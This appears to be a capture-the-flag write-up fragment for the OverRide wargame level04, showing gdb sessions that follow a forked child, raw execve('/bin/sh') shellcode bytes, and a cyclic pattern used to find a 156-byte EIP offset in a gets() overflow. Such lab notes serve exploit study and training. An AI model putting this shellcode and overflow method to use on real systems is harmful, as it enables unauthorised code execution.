

```
level04@OverRide:~$ ./level04
Give me some shellcode, k
\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80
child is exiting...
```

```
run

=> 0x080486d6 <+14>:	call   0x8048550 <fork@plt>
   0x080486db <+19>:	mov    %eax,0xac(%esp)
   
(gdb) ni
0x080486db in main ()
(gdb) Give me some shellcode, k   
   
```
as u see the main parent process jumps directly to the prompt


(gdb) set follow-fork-mode child

=> 0x804875e <main+150>:	call   0x80484b0 <gets@plt>

```
(gdb) run <<< "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab"

Program received signal SIGSEGV, Segmentation fault.
[Switching to process 1709]
=> 0x6261616f

(gdb) i r $eip
eip            0x6261616f

➜  Desktop cyclic -l 0x6261616f
156

```






























